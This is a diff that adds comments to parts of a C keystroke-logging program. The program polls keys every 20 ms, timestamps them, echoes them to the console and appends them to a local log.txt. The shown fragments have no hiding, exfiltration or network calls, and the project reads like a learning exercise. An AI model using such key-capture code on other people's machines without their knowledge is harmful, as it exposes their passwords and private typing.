@@ -5,6 +5,7 @@
 #include <time.h>
 #include "header.h"
 
+/* Function that checks for keyboard input every 20ms (so that it doesn't hog all of the CPU) */
 void checkKeyboard(FILE* fp, int flag, int inKeys[NUMKEYS], char outKeys[NUMKEYS][KEYLETTERS], char shiftedKeys[SHIFTKEYS][KEYLETTERS]) {
     int i;
     for (i = 0; i < NUMKEYS; i++) {
@@ -20,6 +21,7 @@ void checkKeyboard(FILE* fp, int flag, int inKeys[NUMKEYS], char outKeys[NUMKEYS
     Sleep(20);
 }
 
+/* Function that prints keyboard input other than shift since shift works differently due to other characters being dependent on if shift is held or not */
 void nonShiftPrint(FILE* fp, int checkShift, int flag, int counter, char outKeys[NUMKEYS][KEYLETTERS], char shiftedKeys[SHIFTKEYS][KEYLETTERS]) {
     if (flag != 0) {
         if (checkShift != 0 && counter < SHIFTKEYS) {
@@ -34,12 +36,14 @@ void nonShiftPrint(FILE* fp, int checkShift, int flag, int counter, char outKeys
     }
 }
 
+/* Prints shift */
 void shiftPrint(FILE* fp) {
     printTime(fp);
     printf("'shift' \n");
     fprintf(fp, "'shift' \n");
 }
 
+/* Prints the current time */
 void printTime(FILE* fp) {
     time_t t;
     time(&t);
@@ -50,6 +54,7 @@ void printTime(FILE* fp) {
     fprintf(fp, "[%s]: ", timeString);
 }
 
+/* Opens the log file and if it doesnt exist, it generates one, if there is an error the program will exit */
 FILE* openFile() {
     FILE* fp;
     if ((fp = fopen("log.txt", "a+")) == NULL) {
@@ -59,6 +64,7 @@ FILE* openFile() {
     return(fp);
 }
 
+/* Updates the file log file every 10 seconds */
 void updateFile(int *timerPtr, FILE* fp) {
     if (*timerPtr == 500) {
         *timerPtr = 0;
